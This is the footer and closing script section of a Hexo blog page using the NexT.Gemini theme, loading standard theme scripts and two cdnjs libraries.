  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
